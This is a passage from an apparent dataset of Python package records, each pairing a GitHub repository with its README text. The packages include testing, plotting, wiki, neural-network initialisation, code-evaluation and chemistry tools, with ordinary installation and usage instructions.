pytest --module-names=mymodule,othermodule --test-paths=tests.unit,tests.e2e.*
```

or (in `pytest.ini`)

```
[pytest]
module_names = mymodule othermodule
test_paths = tests.unit tests.e2e.*
```
","# Pytest Patch

An automagic replacement for `monkeypatch` or `unittest.mock.patch` that can be
used on objects either directly or by name.

![tests](https://github.com/megawidget/pytest-patch/actions/workflows/python-package.yml/badge.svg)

## Usage

### patching objects directly

```
from pytest import fixture
from mock import MagicMock, sentinel

from mymodule import callee, caller  # `caller` returns `callee()`


@fixture
def callee_mock(patch):
  # returns the second argument if provided, `MagicMock()` otherwise
  return patch(callee, MagicMock(return_value=sentinel.callee))


def test_caller(callee_mock):
  assert caller() == sentinel.callee
```


### patching objects by name

```
@fixture
def callee_mock(patch):
  return patch('callee')  # assumes `callee` is in `mymodule`
```


### patching by full path

This behavior is similar to `unittest.mock.patch`.

```
@fixture
def callee_mock(patch):
  return patch('mymodule.callee')
```


## Configuration

By default, `pytest-patch` assumes the following repository structure:

```
mymodule/
  .git/
    ...
  mymodule/
    wat/
      ermelon.py
    ...
  tests/
    */  # e.g. unit/
      mymodule/
        wat/
          test_ermelon.py
    ...
```

No configuration is needed if your repository matches this structure where the
repository name is the same as the name of the module and your tests are in
their corresponding subdirectories mirroring your module's path structure.

If the above is not the case, e.g. you have a repository with a nonmatching
module name or a monorepo with multiple modules, you may specify the
corresponding flags either in the `pytest` command line or the ini file,
glob-style:

```
pytest --module-names=mymodule,othermodule --test-paths=tests.unit,tests.e2e.*
```

or (in `pytest.ini`)

```
[pytest]
module_names = mymodule othermodule
test_paths = tests.unit tests.e2e.*
```
",megawidget/pytest-patch
twitter-graphql,https://github.com/trevorhobenshield/twitter-graphql,5,34,34,"

Unofficial Twitter GraphQL API

","

Unofficial Twitter GraphQL API

",trevorhobenshield/twitter-graphql
tegda,https://github.com/Robertoarce/tegda,1,1210,1210,"=============
Terrific EGDA
=============


.. image:: https://img.shields.io/pypi/v/tegda.svg
        :target: https://pypi.python.org/pypi/tegda

.. image:: https://img.shields.io/travis/Robertoarce/tegda.svg
        :target: https://travis-ci.com/Robertoarce/tegda

.. image:: https://readthedocs.org/projects/tegda/badge/?version=latest
        :target: https://tegda.readthedocs.io/en/latest/?version=latest
        :alt: Documentation Status


.. image:: https://pyup.io/repos/github/Robertoarce/tegda/shield.svg
     :target: https://pyup.io/repos/github/Robertoarce/tegda/
     :alt: Updates



Tegda creates an easy customizable visual representations of data for exploratory analysis.


* Free software: MIT license
* Documentation: https://tegda.readthedocs.io.


Features
--------

* Use several visualization

Credits
-------

This package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.

.. _Cookiecutter: https://github.com/audreyr/cookiecutter
.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage


=======
History
=======

0.1.0 (2023-04-27)
------------------

* First release on PyPI.
* Adding PyPI and TestPypi

","=============
Terrific EGDA
=============


.. image:: https://img.shields.io/pypi/v/tegda.svg
        :target: https://pypi.python.org/pypi/tegda

.. image:: https://img.shields.io/travis/Robertoarce/tegda.svg
        :target: https://travis-ci.com/Robertoarce/tegda

.. image:: https://readthedocs.org/projects/tegda/badge/?version=latest
        :target: https://tegda.readthedocs.io/en/latest/?version=latest
        :alt: Documentation Status


.. image:: https://pyup.io/repos/github/Robertoarce/tegda/shield.svg
     :target: https://pyup.io/repos/github/Robertoarce/tegda/
     :alt: Updates



Tegda creates an easy customizable visual representations of data for exploratory analysis.


* Free software: MIT license
* Documentation: https://tegda.readthedocs.io.


Features
--------

* Use several visualization

Credits
-------

This package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.

.. _Cookiecutter: https://github.com/audreyr/cookiecutter
.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage


=======
History
=======

0.1.0 (2023-04-27)
------------------

* First release on PyPI.
* Adding PyPI and TestPypi

",robertoarce/tegda
b2tob64,https://github.com/vjgtigers/b2tob64,0,317,293,"This package allows for custom encoding between base2 (bianary) and base 64. <br>
WARNING: THIS WILL NOT TRANSLATE other b64 encodings and will NOT be able to encode/decode the same values <br>
<br>
<br>
Ex. ""10101010101000010111111001"" --> ""ppE9AA"" --> ""10101010101000010111111001""
<br><br>
Approx. 6x len reduction
","This package allows for custom encoding between base2 (bianary) and base 64. 
WARNING: THIS WILL NOT TRANSLATE other b64 encodings and will NOT be able to encode/decode the same values 


Ex. ""10101010101000010111111001"" --> ""ppE9AA"" --> ""10101010101000010111111001""

Approx. 6x len reduction
",vjgtigers/b2tob64
aa-simplewiki,https://github.com/meowosaurus/aa-simplewiki,2,4701,4701,"# SimpleWiki
A simple wiki system for alliance auth. It supports multiple pages with different sections. Every page and every section can have their own icon.

# Contents
* [Current Features](#current-features)
  * [ToDo](#todo)
  * [Planned](#planned)
* [Screenshots](#screenshots)
* [Installation](#installation)
  * [Alliance Auth Production](#alliance-auth-production)
    * [Non-Docker Version](#non-docker-version)
    * [Docker Version](#docker-version)
  * [Alliance Auth Development](#alliance-auth-development)
* [Usage](#usage)
* [Permissions](#permissions)
* [Support](#support)

# Current Features
* Create custom wiki menus with dropdowns plus different sections on each menu
* Add an icon next to menus or sections
* Edit pages on the admin panel with [markdown](https://commonmark.org/help/)
* Search function: Search across all wiki menus and sections
* Permission system:
  * Editor permissions can be added to single users or groups via the admin panel
  * Alliance Auth groups are synced to simplewiki: Certain pages can only be seen by a specific group
  * Multiple groups support: As long as the user is in any of the required groups, they can access the menu
* Editor interface
  * Users with editor permission can create, edit and delete custom menus and sections (editor_access)
  * Users with editor permission see edit and delete buttons above all sections (editor_access)

## ToDo:
* Quality-of-life updates
* Improve code documentation
* Clean-up code

## Planned
* Drag and drop system to make indexing menus and sections easier
* Add translations for 
  * German
  * Spanish
  * Chinese
  * Russian
  * Korean 
  * French
  * Italian

### Active devs:
* [Meowosaurus](https://github.com/meowosaurus)

## Screenshots
![Showcase](https://i.postimg.cc/BQc3hPYb/vmplayer-Kvz8-DNZa-M0.gif)

### Search
![Search](https://i.imgur.com/wW69LFN.png)

### Admin Panel
![Menu Admin](https://i.imgur.com/VGssV4d.png)

![Menu Edit](https://i.imgur.com/15DSNfZ.png)

![Section Edit](https://i.imgur.com/3LrysW7.png)

## Installation

### Alliance Auth Production

#### Non-Docker Version
1.) Install the pip package via `pip install aa-simplewiki`

2.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

3.) Make migrations and migrate, then restart your server

#### Docker Version
1.) Please make sure you followed the custom docker-image tutorial [here](https://gitlab.com/allianceauth/allianceauth/-/tree/master/docker#using-a-custom-docker-image): 

2.) Edit your `conf/requirements` and add the following line `aa-simplewiki` (Check https://pypi.org/project/aa-simplewiki/ for different versions!)

3.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

4.) Start your server `docker compose --env-file=.env up -d`

5.) Run `docker compose exec allianceauth bash`

6.) Run `allianceauth update myauth`

7.) Run `auth migrate`

8.) Run `auth collectstatic`

### Alliance Auth Development 
Make sure you have installed alliance auth in the correct way: https://allianceauth.readthedocs.io/en/latest/development/dev_setup/index.html

1.) Download the repo `git clone https://github.com/meowosaurus/aa-simplewiki`

2.) Make sure it's under the root folder `aa-dev`, not under `myauth` 

3.) Change directory into `aa-dev` aand run `pip install -e aa-simplewiki`

**Important**: If you are getting an error saying that `simplewiki` is not installed after running `pip install -e aa-simplewiki`, delete the `setup.py` file in the aa-simplewiki root directory and try again.

4.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

5.) Change directory into `myauth`

6.) Make migrations with `python manage.py makemigrations`

7.) Migrate with `python manage.py migrate`

8.) Restart auth with `python manage.py runserver`

## Usage
Check out our wiki on GitHub: https://github.com/meowosaurus/aa-simplewiki/wiki

1.) Go to `{your_auth_url}/admin` -> SimpleWiki -> Add Menu Item

2.) Give it a title, an index (menu items are sorted by their index from low to high) and a name (the name is the name in the url) and hit save.

3.) Go to `{your_auth_url}/admin` -> SimpleWiki -> Add Page Item

4.) Give it a title, a menu page (this is the menu page it will be under), an index (ordered from low to high) and a content description. This description will be the main content and you can use HTML. Hit save.

5.) Go back to your main auth page, go under Wiki and you've created your first menu and page.

## Permissions
Perm | Admin Site | Auth Site 
 --- | --- | --- 
basic_access | None | Can view all wiki pages
editor_access | None | Can create, edit and delete wiki pages and menus

## Support
* On Discord: Meowlicious#7045
","# SimpleWiki
A simple wiki system for alliance auth. It supports multiple pages with different sections. Every page and every section can have their own icon.

# Contents
* [Current Features](#current-features)
  * [ToDo](#todo)
  * [Planned](#planned)
* [Screenshots](#screenshots)
* [Installation](#installation)
  * [Alliance Auth Production](#alliance-auth-production)
    * [Non-Docker Version](#non-docker-version)
    * [Docker Version](#docker-version)
  * [Alliance Auth Development](#alliance-auth-development)
* [Usage](#usage)
* [Permissions](#permissions)
* [Support](#support)

# Current Features
* Create custom wiki menus with dropdowns plus different sections on each menu
* Add an icon next to menus or sections
* Edit pages on the admin panel with [markdown](https://commonmark.org/help/)
* Search function: Search across all wiki menus and sections
* Permission system:
  * Editor permissions can be added to single users or groups via the admin panel
  * Alliance Auth groups are synced to simplewiki: Certain pages can only be seen by a specific group
  * Multiple groups support: As long as the user is in any of the required groups, they can access the menu
* Editor interface
  * Users with editor permission can create, edit and delete custom menus and sections (editor_access)
  * Users with editor permission see edit and delete buttons above all sections (editor_access)

## ToDo:
* Quality-of-life updates
* Improve code documentation
* Clean-up code

## Planned
* Drag and drop system to make indexing menus and sections easier
* Add translations for 
  * German
  * Spanish
  * Chinese
  * Russian
  * Korean 
  * French
  * Italian

### Active devs:
* [Meowosaurus](https://github.com/meowosaurus)

## Screenshots
![Showcase](https://i.postimg.cc/BQc3hPYb/vmplayer-Kvz8-DNZa-M0.gif)

### Search
![Search](https://i.imgur.com/wW69LFN.png)

### Admin Panel
![Menu Admin](https://i.imgur.com/VGssV4d.png)

![Menu Edit](https://i.imgur.com/15DSNfZ.png)

![Section Edit](https://i.imgur.com/3LrysW7.png)

## Installation

### Alliance Auth Production

#### Non-Docker Version
1.) Install the pip package via `pip install aa-simplewiki`

2.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

3.) Make migrations and migrate, then restart your server

#### Docker Version
1.) Please make sure you followed the custom docker-image tutorial [here](https://gitlab.com/allianceauth/allianceauth/-/tree/master/docker#using-a-custom-docker-image): 

2.) Edit your `conf/requirements` and add the following line `aa-simplewiki` (Check https://pypi.org/project/aa-simplewiki/ for different versions!)

3.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

4.) Start your server `docker compose --env-file=.env up -d`

5.) Run `docker compose exec allianceauth bash`

6.) Run `allianceauth update myauth`

7.) Run `auth migrate`

8.) Run `auth collectstatic`

### Alliance Auth Development 
Make sure you have installed alliance auth in the correct way: https://allianceauth.readthedocs.io/en/latest/development/dev_setup/index.html

1.) Download the repo `git clone https://github.com/meowosaurus/aa-simplewiki`

2.) Make sure it's under the root folder `aa-dev`, not under `myauth` 

3.) Change directory into `aa-dev` aand run `pip install -e aa-simplewiki`

**Important**: If you are getting an error saying that `simplewiki` is not installed after running `pip install -e aa-simplewiki`, delete the `setup.py` file in the aa-simplewiki root directory and try again.

4.) Add `simplewiki` to your `INSTALLED_APPS` in your projects `local.py`

5.) Change directory into `myauth`

6.) Make migrations with `python manage.py makemigrations`

7.) Migrate with `python manage.py migrate`

8.) Restart auth with `python manage.py runserver`

## Usage
Check out our wiki on GitHub: https://github.com/meowosaurus/aa-simplewiki/wiki

1.) Go to `{your_auth_url}/admin` -> SimpleWiki -> Add Menu Item

2.) Give it a title, an index (menu items are sorted by their index from low to high) and a name (the name is the name in the url) and hit save.

3.) Go to `{your_auth_url}/admin` -> SimpleWiki -> Add Page Item

4.) Give it a title, a menu page (this is the menu page it will be under), an index (ordered from low to high) and a content description. This description will be the main content and you can use HTML. Hit save.

5.) Go back to your main auth page, go under Wiki and you've created your first menu and page.

## Permissions
Perm | Admin Site | Auth Site 
 --- | --- | --- 
basic_access | None | Can view all wiki pages
editor_access | None | Can create, edit and delete wiki pages and menus

## Support
* On Discord: Meowlicious#7045
",meowosaurus/aa-simplewiki
empirical-init,https://github.com/pb1729/empirical-init,0,3977,3977,"# Empirical Init

This package provides a way of automatically initializing weights in pytorch neural networks using a hacky empirical method. Why do we need it? Well, there are other ways of normalizing weights. But batch norm is terrible, and layer norm is a non-linearity, which is kind of funky. Also, we not only need to keep activations from diverging, we need to keep the gradients from diverging too, and it would be *really* funky to apply a non-linearity to our gradients. The [maximum update parametrization](http://proceedings.mlr.press/v139/yang21c/yang21c.pdf) of Greg Yang and Edward Hu provides a recipe for how to scale all the gradients and activations so that the following three pillars are upheld:

* Non-divergent activations: Activations in all layers should be approximately O(1)
* Non-divergent gradients: Gradients in all layers should be approximately O(1)
* Maximum stable update: The change in activations for learning rate equal to 1 should be approximately O(1). (But in practice we don't want updates quite this large so we'll use a smaller learning rate like `1e-3` or something.)

Their technique for achieving this is to represent the neural network as a tensor program and then do a whole lot of math to figure out how the activations and gradients and updates will flow through the network. But all that sounds like *work*. Know what's easier and no work at all? Just running your neural network! You already have it coded up, running it is a single function call. Then instead of *computing* all these things, we can just *measure* them.

## Usage

Empirical init works by wrapping all modules in a helper module that scales the activations and gradients by tunable amounts. The wrapper class is called `Normed`, and you can certainly wrap your submodules manually. But the easiest way to wrap all submodules is to use the decorator `@wrap_all_leaf_modules` to modify `__init__()`. This will wrap every leaf module under your module that has any trainable parameters.

```
import torch.nn as nn
from empirical_init import wrap_all_leaf_modules

...

class MyModule(nn.Module):
  @wrap_all_leaf_modules
  def __init__(self, device=""cpu""):
    super().__init__()
    ...
```

`Normed` has the tunable scalings registered as buffers, so they won't count as trainable but they'll still be in the state dict when you go to save your module. However, these scalings must actually be tuned to the correct values. This can be done with a call to `empirical_init` like so:

```
import torch
from empirical_init import get_wrapped_submodules, empirical_init

...

def dummy_input(batchsz):
  return torch.randn(batchsz, 100)
def dummy_loss(model_output):
  return model_output.mean()

my_module = MyModule()
empirical_init(
  get_wrapped_submodules(my_module), my_module,
  dummy_input, dummy_loss)
```

This will print out a bunch of helpful debug information about the tuning process. In particular, the magnitudes of activations and gradients going in and out of each wrapped submodule will be printed. After the call completes, all the scaling factors should be properly tuned.

Note that the number of calls made by empirical_init to your network scales with the number of layers in your network. So if your network takes a while to run or it has a lot of layers, empirical_init could take a while to terminate. Try it on a small fast network first if it's your first time using this package.

The dummy functions are there to provide realistic-looking data and gradients for your network to consume. The dummy input function should generate random input data of the provided batch size. The dummy loss function should produce a loss when passed the output of the network. A good rule of thumb is to have the dummy input function call `torch.randn()` to produce input of the right shape, and the dummy loss function should be the same as your actual loss function, but with randomized labels.
","# Empirical Init

This package provides a way of automatically initializing weights in pytorch neural networks using a hacky empirical method. Why do we need it? Well, there are other ways of normalizing weights. But batch norm is terrible, and layer norm is a non-linearity, which is kind of funky. Also, we not only need to keep activations from diverging, we need to keep the gradients from diverging too, and it would be *really* funky to apply a non-linearity to our gradients. The [maximum update parametrization](http://proceedings.mlr.press/v139/yang21c/yang21c.pdf) of Greg Yang and Edward Hu provides a recipe for how to scale all the gradients and activations so that the following three pillars are upheld:

* Non-divergent activations: Activations in all layers should be approximately O(1)
* Non-divergent gradients: Gradients in all layers should be approximately O(1)
* Maximum stable update: The change in activations for learning rate equal to 1 should be approximately O(1). (But in practice we don't want updates quite this large so we'll use a smaller learning rate like `1e-3` or something.)

Their technique for achieving this is to represent the neural network as a tensor program and then do a whole lot of math to figure out how the activations and gradients and updates will flow through the network. But all that sounds like *work*. Know what's easier and no work at all? Just running your neural network! You already have it coded up, running it is a single function call. Then instead of *computing* all these things, we can just *measure* them.

## Usage

Empirical init works by wrapping all modules in a helper module that scales the activations and gradients by tunable amounts. The wrapper class is called `Normed`, and you can certainly wrap your submodules manually. But the easiest way to wrap all submodules is to use the decorator `@wrap_all_leaf_modules` to modify `__init__()`. This will wrap every leaf module under your module that has any trainable parameters.

```
import torch.nn as nn
from empirical_init import wrap_all_leaf_modules

...

class MyModule(nn.Module):
  @wrap_all_leaf_modules
  def __init__(self, device=""cpu""):
    super().__init__()
    ...
```

`Normed` has the tunable scalings registered as buffers, so they won't count as trainable but they'll still be in the state dict when you go to save your module. However, these scalings must actually be tuned to the correct values. This can be done with a call to `empirical_init` like so:

```
import torch
from empirical_init import get_wrapped_submodules, empirical_init

...

def dummy_input(batchsz):
  return torch.randn(batchsz, 100)
def dummy_loss(model_output):
  return model_output.mean()

my_module = MyModule()
empirical_init(
  get_wrapped_submodules(my_module), my_module,
  dummy_input, dummy_loss)
```

This will print out a bunch of helpful debug information about the tuning process. In particular, the magnitudes of activations and gradients going in and out of each wrapped submodule will be printed. After the call completes, all the scaling factors should be properly tuned.

Note that the number of calls made by empirical_init to your network scales with the number of layers in your network. So if your network takes a while to run or it has a lot of layers, empirical_init could take a while to terminate. Try it on a small fast network first if it's your first time using this package.

The dummy functions are there to provide realistic-looking data and gradients for your network to consume. The dummy input function should generate random input data of the provided batch size. The dummy loss function should produce a loss when passed the output of the network. A good rule of thumb is to have the dummy input function call `torch.randn()` to produce input of the right shape, and the dummy loss function should be the same as your actual loss function, but with randomized labels.
",pb1729/empirical-init
shifts-scheduler,https://github.com/bakissation/ShiftsScheduler,0,0,0,,,bakissation/shiftsscheduler
bdpotentiometer,https://github.com/bond-anton/BDPotentiometer,0,557,557,"# BDPotentiometer

![Build](https://github.com/bond-anton/BDPotentiometer/workflows/Build/badge.svg)

Module to operate Digital Potentiometer over SPI bus. Extends gpiozero SPIDev class.

## Installation

To install BDPotentiometer run
```shell
pip install BDPotentiometer
```
or
```shell
python setup.py install
```
## Usage

Just import the correct potentiometer class and start operating your pot. 

Please see the demo directory for the usage examples.

## License

BDPotentiometer is free open source software licensed under Apache license version 2.0
","# BDPotentiometer

![Build](https://github.com/bond-anton/BDPotentiometer/workflows/Build/badge.svg)

Module to operate Digital Potentiometer over SPI bus. Extends gpiozero SPIDev class.

## Installation

To install BDPotentiometer run
```shell
pip install BDPotentiometer
```
or
```shell
python setup.py install
```
## Usage

Just import the correct potentiometer class and start operating your pot. 

Please see the demo directory for the usage examples.

## License

BDPotentiometer is free open source software licensed under Apache license version 2.0
",bond-anton/bdpotentiometer
aligned-text-table,https://github.com/nottrobin/aligned-text-table,0,654,654,"# Aligned text table

A parser for tables in plain text that are aligned with spaces, e.g.:

```
This is     Column two   This one
column one               is column
                         three
```

## Usage

```
>>> from aligned_text_table import parse_row

>>> parse_row(
...     lines=[
...         ""This is     Column two   This one "",
...         ""column one               is column"",
...         ""three    ""
...     ],
...     keys=[""one"", ""two"", ""three""]
... )

{
    ""one"": ""This is column one"",
    ""two"": ""Column two"",
    ""three"": ""This one is column three""
}
```

## Tests

To run tests, install and run Tox:

```
pip3 install tox
tox
```
","# Aligned text table

A parser for tables in plain text that are aligned with spaces, e.g.:

```
This is     Column two   This one
column one               is column
                         three
```

## Usage

```
>>> from aligned_text_table import parse_row

>>> parse_row(
...     lines=[
...         ""This is     Column two   This one "",
...         ""column one               is column"",
...         ""three    ""
...     ],
...     keys=[""one"", ""two"", ""three""]
... )

{
    ""one"": ""This is column one"",
    ""two"": ""Column two"",
    ""three"": ""This one is column three""
}
```

## Tests

To run tests, install and run Tox:

```
pip3 install tox
tox
```
",nottrobin/aligned-text-table
code-bert-score,https://github.com/neulab/code-bert-score,0,5790,5790,"# CodeBERTScore
This is the official implementation of the paper:

Shuyan Zhou, Uri Alon, Sumit Agarwal, Graham Neubig, [CodeBERTScore: Evaluating Code Generation with Pretrained Models of Code](https://arxiv.org/pdf/2302.05527.pdf)

CodeBERTScore is an Automatic Evaluation Metric for Code, based on [BERTScore](https://arxiv.org/abs/1904.09675).
This repository is based on the code of [BERTScore](https://github.com/Tiiiger/bert_score), and we are grateful to the authors for releasing their code.

---
* [Example](#example)
* [How does it work?](#how-does-it-work)
* [Usage](#usage)
* [Additional Features](#additional-features)
* [Backend Model](#backend-model)
* [Training](#training)
* [Evaluation](#evaluation)
    + [Human Evaluation](#human-evaluation)
    + [Functional Correctness](#functional-correctness)
* [Citation](#citation)

## Example:

![](./images/example.png ""Example"")

Figure (a) shows a reference code snippet in Java. Figures (b) and (c) show two generated predictions. Among these two candidates and given the reference, BLEU prefers (scores higher) the code in (b), which is not functionally equivalent to the reference, while CodeBERTScore prefers the code in (c), which is functionaly equivalent to the reference.

## How does it work?

![](./images/flow.png ""Example"")

As BERTScore, CodeBERTScore leverages the pre-trained contextual embeddings from a model such as CodeBERT and matches
words in candidate and reference sentences by cosine similarity.
Differently from BERTScore, CodeBERTScore also encodes natural language input or other context along with the generated code, but does not use that context to compute cosine similarities.

This example shows how CodeBERTScore can compute the similarity between the Python expressions `x ** 0.5` and `math.sqrt(x)`, which are functionally equivalent, even though they have very few overlapping tokens.



## Usage
```
import code_bert_score
pred_results = code_bert_score.score(cands=predictions, refs=refs, lang='python')
```
Where `pred_results` is a 4-tuple of `(precision, recall, F1, F3)`, where each is a 1-D tensor of scores for each prediction-reference pair. `F3` is similar to the well-known `F1` score, that considers recall 3 times as important as precision. See the [definition on Wikipedia](https://en.wikipedia.org/wiki/F-score#F%CE%B2_score).

See our [example.py](./example.py) script. Additional details are shown in the original BERTScore [demo notebook](./example/Demo.ipynb).

## Huggingface 🤗 Models
We fine-tuned the `microsoft/codebert-base-mlm` model for 1,000,000 steps (with `batch_size=32`) on several languages separately.

We released the following models to the Huggingface hub:
* `neulab/codebert-python` (the default model for `lang='python'`)
* `neulab/codebert-javascript` (the default model for `lang='javascript'` or `'js'`)
* `neulab/codebert-c` (the default model for `lang='c'`)
* `neulab/codebert-cpp` (the default model for `lang='cpp'` or `'c++'`)
* `neulab/codebert-java` (the default model for `lang='java'`)

The appropriate model will be loaded automatically when passing the `lang` argument to the `score(..)` function, for example: `lang='python'`. 
For other uses, these models can be loaded using (for example):
```python
from transformers import AutoTokenizer, AutoModelForMaskedLM

tokenizer = AutoTokenizer.from_pretrained(""neulab/codebert-python"")
model = AutoModelForMaskedLM.from_pretrained(""neulab/codebert-python"")
```

## Additional Features

* We found that in NL->Code problems, more accurate results are achieved by encoding the NL `sources` with the code prediction, but then measuring similarity only for the encoded code:

```
pred_results = code_bert_score.score(cands=predictions, refs=refs, lang='python', sources=sources)
```

* We also found that using Inverse Document Frequencies improve the results, similarly to the original BERTScore. We included an example script that shows how to precompute them here [compute_idf.py](https://github.com/neulab/code-bert-score/blob/main/compute_idf.py). Then, the resulting dictionary can be used with the argument `idf=idf_dict`.
Our IDF dicts can be found in [./idf_dicts/](./idf_dicts/).

* Tuning the layer that the similarity is computed from is also helpful, using `num_layers=N` where `N` is between 5-10: 

![](./images/layer.jpg ""Layers"")

* We found that more accurate results are achieved by encoding the *entire* inputs, but measures the similarity only between non-punctuation and non-whitespace tokens. To disable the removal of punctuation toksn, use `no_punc=False`. 


See also our [example.py](./example.py) script. Additional details are shown in the original BERTScore [demo notebook](./example/Demo.ipynb).

## Training
The [`run_mlm.py`](./run_mlm.py) script can be used to fine-tune the base model `microsoft/codebert-base-mlm` on specific languages.

## Evaluation
The code to reproduce the results in the paper can be found in the [evaluation](./evaluation/README.md).
### Human Evaluation

![](./images/human.png ""Example"")

We find that CodeBERTScore is more correlated with human preference compared to a variety of common metrics. See more details in the [paper](https://arxiv.org/pdf/2302.05527.pdf).

### Functional Correctness

![](./images/functional.png ""Example"")

We find that CodeBERTScore is more correlated with functional correctness compared to a variety of common metrics. See more details in the [paper](https://arxiv.org/pdf/2302.05527.pdf).

## Citation
```
@article{zhou2023codebertscore,
  url = {https://arxiv.org/abs/2302.05527},
  author = {Zhou, Shuyan and Alon, Uri and Agarwal, Sumit and Neubig, Graham},
  title = {CodeBERTScore: Evaluating Code Generation with Pretrained Models of Code},  
  publisher = {arXiv},
  year = {2023},
}
```


","# CodeBERTScore
This is the official implementation of the paper:

Shuyan Zhou, Uri Alon, Sumit Agarwal, Graham Neubig, [CodeBERTScore: Evaluating Code Generation with Pretrained Models of Code](https://arxiv.org/pdf/2302.05527.pdf)

CodeBERTScore is an Automatic Evaluation Metric for Code, based on [BERTScore](https://arxiv.org/abs/1904.09675).
This repository is based on the code of [BERTScore](https://github.com/Tiiiger/bert_score), and we are grateful to the authors for releasing their code.

---
* [Example](#example)
* [How does it work?](#how-does-it-work)
* [Usage](#usage)
* [Additional Features](#additional-features)
* [Backend Model](#backend-model)
* [Training](#training)
* [Evaluation](#evaluation)
    + [Human Evaluation](#human-evaluation)
    + [Functional Correctness](#functional-correctness)
* [Citation](#citation)

## Example:

![](./images/example.png ""Example"")

Figure (a) shows a reference code snippet in Java. Figures (b) and (c) show two generated predictions. Among these two candidates and given the reference, BLEU prefers (scores higher) the code in (b), which is not functionally equivalent to the reference, while CodeBERTScore prefers the code in (c), which is functionaly equivalent to the reference.

## How does it work?

![](./images/flow.png ""Example"")

As BERTScore, CodeBERTScore leverages the pre-trained contextual embeddings from a model such as CodeBERT and matches
words in candidate and reference sentences by cosine similarity.
Differently from BERTScore, CodeBERTScore also encodes natural language input or other context along with the generated code, but does not use that context to compute cosine similarities.

This example shows how CodeBERTScore can compute the similarity between the Python expressions `x ** 0.5` and `math.sqrt(x)`, which are functionally equivalent, even though they have very few overlapping tokens.



## Usage
```
import code_bert_score
pred_results = code_bert_score.score(cands=predictions, refs=refs, lang='python')
```
Where `pred_results` is a 4-tuple of `(precision, recall, F1, F3)`, where each is a 1-D tensor of scores for each prediction-reference pair. `F3` is similar to the well-known `F1` score, that considers recall 3 times as important as precision. See the [definition on Wikipedia](https://en.wikipedia.org/wiki/F-score#F%CE%B2_score).

See our [example.py](./example.py) script. Additional details are shown in the original BERTScore [demo notebook](./example/Demo.ipynb).

## Huggingface 🤗 Models
We fine-tuned the `microsoft/codebert-base-mlm` model for 1,000,000 steps (with `batch_size=32`) on several languages separately.

We released the following models to the Huggingface hub:
* `neulab/codebert-python` (the default model for `lang='python'`)
* `neulab/codebert-javascript` (the default model for `lang='javascript'` or `'js'`)
* `neulab/codebert-c` (the default model for `lang='c'`)
* `neulab/codebert-cpp` (the default model for `lang='cpp'` or `'c++'`)
* `neulab/codebert-java` (the default model for `lang='java'`)

The appropriate model will be loaded automatically when passing the `lang` argument to the `score(..)` function, for example: `lang='python'`. 
For other uses, these models can be loaded using (for example):
```python
from transformers import AutoTokenizer, AutoModelForMaskedLM

tokenizer = AutoTokenizer.from_pretrained(""neulab/codebert-python"")
model = AutoModelForMaskedLM.from_pretrained(""neulab/codebert-python"")
```

## Additional Features

* We found that in NL->Code problems, more accurate results are achieved by encoding the NL `sources` with the code prediction, but then measuring similarity only for the encoded code:

```
pred_results = code_bert_score.score(cands=predictions, refs=refs, lang='python', sources=sources)
```

* We also found that using Inverse Document Frequencies improve the results, similarly to the original BERTScore. We included an example script that shows how to precompute them here [compute_idf.py](https://github.com/neulab/code-bert-score/blob/main/compute_idf.py). Then, the resulting dictionary can be used with the argument `idf=idf_dict`.
Our IDF dicts can be found in [./idf_dicts/](./idf_dicts/).

* Tuning the layer that the similarity is computed from is also helpful, using `num_layers=N` where `N` is between 5-10: 

![](./images/layer.jpg ""Layers"")

* We found that more accurate results are achieved by encoding the *entire* inputs, but measures the similarity only between non-punctuation and non-whitespace tokens. To disable the removal of punctuation toksn, use `no_punc=False`. 


See also our [example.py](./example.py) script. Additional details are shown in the original BERTScore [demo notebook](./example/Demo.ipynb).

## Training
The [`run_mlm.py`](./run_mlm.py) script can be used to fine-tune the base model `microsoft/codebert-base-mlm` on specific languages.

## Evaluation
The code to reproduce the results in the paper can be found in the [evaluation](./evaluation/README.md).
### Human Evaluation

![](./images/human.png ""Example"")

We find that CodeBERTScore is more correlated with human preference compared to a variety of common metrics. See more details in the [paper](https://arxiv.org/pdf/2302.05527.pdf).

### Functional Correctness

![](./images/functional.png ""Example"")

We find that CodeBERTScore is more correlated with functional correctness compared to a variety of common metrics. See more details in the [paper](https://arxiv.org/pdf/2302.05527.pdf).

## Citation
```
@article{zhou2023codebertscore,
  url = {https://arxiv.org/abs/2302.05527},
  author = {Zhou, Shuyan and Alon, Uri and Agarwal, Sumit and Neubig, Graham},
  title = {CodeBERTScore: Evaluating Code Generation with Pretrained Models of Code},  
  publisher = {arXiv},
  year = {2023},
}
```


",neulab/code-bert-score
vaspgibbs,https://github.com/ftherrien/VaspGibbs,1,4376,4257,"<h1 align=""center"">
<img src=""https://github.com/ftherrien/VaspGibbs/blob/master/docs/VGlogo.svg"" height=""130"">

VaspGibbs
</h1>
<br>

[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.7874413.svg)](https://doi.org/10.5281/zenodo.7874413)
[![PyPI](https://img.shields.io/pypi/v/vaspgibbs)](https://pypi.org/project/VaspGibbs/)

## Installation

```
pip install VaspGibbs
```
## Usage

In a folder with a finished vasp calculation, run
```
vasp_gibbs
```

`vasp_gibbs` will rerun Vasp to obtain vibration modes and output the gibbs free energy of your system.

Use `-o` (only) or `-t`(top) to specify a set of atoms for which to calculate vibration modes. Examples:

 * `-o C O` would only compute vibration modes associated with C and O keeping all other atoms fixed.
 * `-o 1 3 6` would compute vibration modes associated with the first, third and sixth atoms in the POSCAR keeping all other atoms fixed.
 * `-t 10` would compute vibration modes associated with the first 10 atoms starting from the top of the unit cell along the c axis.

This can be useful when computing free energy differences between systems where one part of the system does not change, e.g. adsorption free energies.

To run vasp in parallel call:
```
vasp_gibbs -n [number of proc] -m [mpi executable] -v [vasp executable]
```

By default `srun` and `vasp_std` are used.

VaspGibbs will automatically compute the moment of inertia and symmetry of your molecule and compute rotational and translational contributions if you specify that the system is a molecule with the `-m` flag.

The temperature and pressure can be set using the `-T` and `-P` flags.

### Output

